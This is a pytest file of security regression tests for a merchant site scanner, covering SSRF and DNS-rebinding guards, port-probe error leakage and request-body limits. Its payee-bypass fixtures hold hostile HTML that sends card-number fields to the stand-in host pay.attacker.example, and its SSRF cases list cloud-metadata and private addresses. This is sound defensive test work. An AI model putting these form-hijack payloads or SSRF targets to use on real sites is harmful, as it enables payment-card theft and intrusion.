"""Security regression tests for the site scanner (review of PR #1).

Each test reproduces a weakness found in review and fails on the original implementation:
SSRF through the TLS probe, port-scan oracle in error text, payee-mismatch bypasses through
formaction / form= / <base> ordering / srcdoc, and crashes on malformed URLs.
"""

import asyncio
import json
import socket
from datetime import date

import pytest

from mandit.safety.http import BodyError, read_json_body
from mandit.safety.site_scan import (
    FixtureMerchantRegistry,
    FixtureReputationStore,
    RegistryMerchant,
    SiteScanner,
    SocketTlsProbe,
    StaticTlsProbe,
    TlsResult,
    load_config,
)
from mandit.safety.site_scan.html_checks import extract_page_structure
from mandit.safety.site_scan.netguard import (
    EgressPolicy,
    EgressRefused,
    is_public_address,
    resolve_checked,
)

MERCHANT = RegistryMerchant(
    "mer_croma_demo", ("croma.mock.mandit.local",), ("croma.demo@mockbank",), "VERIFIED"
)
URL = "https://croma.mock.mandit.local/checkout"


def _scanner() -> SiteScanner:
    return SiteScanner(
        config=load_config(),
        registry=FixtureMerchantRegistry([MERCHANT]),
        reputation=FixtureReputationStore([]),
        tls_probe=StaticTlsProbe({"croma.mock.mandit.local": TlsResult(valid=True)}),
        profile="test",
        today=lambda: date(2026, 11, 24),
    )


def _codes(html: str) -> list[str]:
    return asyncio.run(_scanner().scan(URL, html)).codes


# --- SSRF / egress -----------------------------------------------------------------------------


@pytest.mark.parametrize(
    "addr",
    ["127.0.0.1", "10.1.2.3", "172.16.0.1", "192.168.1.1", "169.254.169.254", "0.0.0.0",
     "100.64.0.1", "::1", "fe80::1", "fc00::1", "::ffff:127.0.0.1", "224.0.0.1", "not-an-ip"],
)  # fmt: skip
def test_non_public_addresses_are_rejected(addr):
    assert not is_public_address(addr)


@pytest.mark.parametrize("addr", ["8.8.8.8", "1.1.1.1", "2606:4700:4700::1111"])
def test_public_addresses_are_accepted(addr):
    assert is_public_address(addr)


def _fake_dns(monkeypatch, answers):
    async def fake(self, host, port, **kw):
        if host not in answers:
            raise socket.gaierror("no such host")
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (a, port)) for a in answers[host]]

    monkeypatch.setattr(asyncio.BaseEventLoop, "getaddrinfo", fake)


@pytest.mark.parametrize(
    "host, answers, code",
    [
        ("metadata.attacker.example", ["169.254.169.254"], "DESTINATION_NOT_PERMITTED"),
        ("rebind.attacker.example", ["93.184.216.34", "127.0.0.1"], "DESTINATION_NOT_PERMITTED"),
        ("missing.example", None, "DNS_FAILED"),
    ],
)
def test_resolve_checked_refuses_private_and_mixed_answers(monkeypatch, host, answers, code):
    _fake_dns(monkeypatch, {host: answers} if answers else {})
    with pytest.raises(EgressRefused) as exc:
        asyncio.run(resolve_checked(host, 443, EgressPolicy()))
    assert exc.value.code == code


def test_resolve_checked_refuses_non_allowlisted_port():
    with pytest.raises(EgressRefused) as exc:
        asyncio.run(resolve_checked("example.com", 6379, EgressPolicy()))
    assert exc.value.code == "PORT_NOT_PERMITTED"


def test_private_mock_hosts_only_with_explicit_suffix(monkeypatch):
    _fake_dns(monkeypatch, {"croma.mock.mandit.local": ["172.18.0.5"]})
    with pytest.raises(EgressRefused):
        asyncio.run(resolve_checked("croma.mock.mandit.local", 443, EgressPolicy()))
    policy = EgressPolicy(private_host_suffixes=("mock.mandit.local",))
    assert asyncio.run(resolve_checked("croma.mock.mandit.local", 443, policy)) == "172.18.0.5"
    # The suffix must be a real parent domain, not a string suffix.
    _fake_dns(monkeypatch, {"evilmock.mandit.local": ["10.0.0.1"]})
    with pytest.raises(EgressRefused):
        asyncio.run(resolve_checked("evilmock.mandit.local", 443, policy))


def test_probe_connects_to_the_vetted_address_not_the_name(monkeypatch):
    """DNS rebinding: the connection must go to the address that passed the check."""
    _fake_dns(monkeypatch, {"shop.example": ["93.184.216.34"]})
    seen = {}

    async def fake_open_connection(host, port, **kw):
        seen.update(host=host, sni=kw.get("server_hostname"))
        raise ConnectionRefusedError()

    monkeypatch.setattr(asyncio, "open_connection", fake_open_connection)
    result = asyncio.run(SocketTlsProbe(timeout_s=1).probe("shop.example", 443))
    assert seen == {"host": "93.184.216.34", "sni": "shop.example"}
    assert result.error == "UNREACHABLE"


def test_probe_errors_do_not_reveal_port_state(monkeypatch):
    _fake_dns(monkeypatch, {"shop.example": ["93.184.216.34"]})
    errors = set()
    for exc in (ConnectionRefusedError(), ConnectionResetError(), TimeoutError(), OSError("x")):

        async def fake_open_connection(host, port, _exc=exc, **kw):
            raise _exc

        monkeypatch.setattr(asyncio, "open_connection", fake_open_connection)
        errors.add(asyncio.run(SocketTlsProbe(timeout_s=1).probe("shop.example", 443)).error)
    assert errors == {"UNREACHABLE"}


def test_https_on_non_standard_port_fails_closed():
    s = SiteScanner(
        config=load_config(),
        registry=FixtureMerchantRegistry([MERCHANT]),
        reputation=FixtureReputationStore([]),
        tls_probe=SocketTlsProbe(timeout_s=1),
        profile="test",
    )
    result = asyncio.run(s.scan("https://croma.mock.mandit.local:6379/"))
    assert "TLS_INVALID" in result.codes
    assert result.tls is not None and result.tls.error == "PORT_NOT_PERMITTED"


# --- Checkout-integrity bypasses -----------------------------------------------------------------

PAYEE_BYPASSES = {
    "button_formaction": '<form action="/pay" id="payment"><input name="card_number">'
    '<button formaction="https://pay.attacker.example/c">Pay</button></form>',
    "input_formaction": '<form action="/pay" id="payment"><input name="card_number">'
    '<input type="submit" formaction="https://pay.attacker.example/c"></form>',
    "base_after_form": '<form action="pay" id="payment"><input name="card_number"></form>'
    '<base href="https://pay.attacker.example/">',
    "first_base_wins": '<base href="https://pay.attacker.example/">'
    '<base href="https://croma.mock.mandit.local/">'
    '<form action="pay" id="payment"><input name="card_number"></form>',
    "form_attribute": '<form id="f" action="https://pay.attacker.example/x"></form>'
    '<input form="f" name="card_number">',
    "srcdoc_form": '<iframe srcdoc="<form action=https://pay.attacker.example/>'
    '<input name=cardnumber></form>"></iframe>',
    "vpa_in_unnamed_field": '<form action="/pay" id="payment">'
    '<input type="hidden" name="payee" value="attacker@okaxis"></form>',
    "unparseable_action": '<form action="http://[bad/pay" id="payment"><input name="card"></form>',
    "unparseable_base": '<base href="http://[::1"><form action="x" id="payment">'
    '<input name="card"></form>',
}


@pytest.mark.parametrize("name", sorted(PAYEE_BYPASSES))
def test_payee_mismatch_bypasses_are_detected(name):
    assert "CHECKOUT_PAYEE_MISMATCH" in _codes(PAYEE_BYPASSES[name])


@pytest.mark.parametrize(
    "html",
    [
        '<embed src="https://pay.attacker.example/card">',
        '<object data="https://pay.attacker.example/card"></object>',
        '<iframe src="http://[bad/payment"></iframe>',
    ],
)
def test_payment_frames_in_other_elements_are_detected(html):
    assert "EXTERNAL_PAYMENT_IFRAME" in _codes(html)


def test_email_newsletter_field_is_not_a_payee():
    html = '<form action="/pay" id="payment"><input name="receipt_email" value="me@mail.example">'
    assert _codes(html) == []


def test_form_with_explicit_form_attr_is_not_attached_to_enclosing_form():
    page = extract_page_structure(
        '<form id="a" action="/search"><input form="b" name="card"></form>'
        '<form id="b" action="/pay"></form>',
        URL,
    )
    assert [f.is_payment for f in page.forms] == [False, True]


def test_srcdoc_recursion_is_bounded():
    html = "x"
    for _ in range(50):
        html = (
            '<iframe srcdoc="' + html.replace("&", "&amp;").replace('"', "&quot;") + '"></iframe>'
        )
    extract_page_structure(html, URL)  # must not recurse 50 levels or raise


# --- Request body limits -------------------------------------------------------------------------


def _request(body: bytes, headers=None):
    from starlette.requests import Request

    sent = False

    async def receive():
        nonlocal sent
        if sent:
            return {"type": "http.request", "body": b"", "more_body": False}
        sent = True
        return {"type": "http.request", "body": body, "more_body": False}

    hdrs = [(k.encode(), v.encode()) for k, v in (headers or {}).items()]
    return Request({"type": "http", "method": "POST", "headers": hdrs}, receive)


@pytest.mark.parametrize(
    "body, headers, status, code",
    [
        (b"{}", {"content-length": "999999999"}, 413, "PAYLOAD_TOO_LARGE"),
        (b"x" * 101, {}, 413, "PAYLOAD_TOO_LARGE"),
        (b"[" * 50 + b"]" * 50, {}, 400, "VALIDATION_ERROR"),
        (b"not json", {}, 400, "VALIDATION_ERROR"),
        (b"\xff\xfe", {}, 400, "VALIDATION_ERROR"),
        (b"{}", {"content-length": "abc"}, 400, "VALIDATION_ERROR"),
    ],
)
def test_body_limits(body, headers, status, code):
    with pytest.raises(BodyError) as exc:
        asyncio.run(read_json_body(_request(body, headers), max_bytes=100))
    assert (exc.value.status, exc.value.code) == (status, code)


def test_deeply_nested_json_is_a_validation_error_not_a_crash():
    deep = b"[" * 100_000 + b"]" * 100_000
    with pytest.raises(BodyError) as exc:
        asyncio.run(read_json_body(_request(deep), max_bytes=1_000_000))
    assert exc.value.code == "VALIDATION_ERROR"


def test_body_accepts_object():
    body = json.dumps({"url": URL}).encode()
    assert asyncio.run(read_json_body(_request(body))) == {"url": URL}
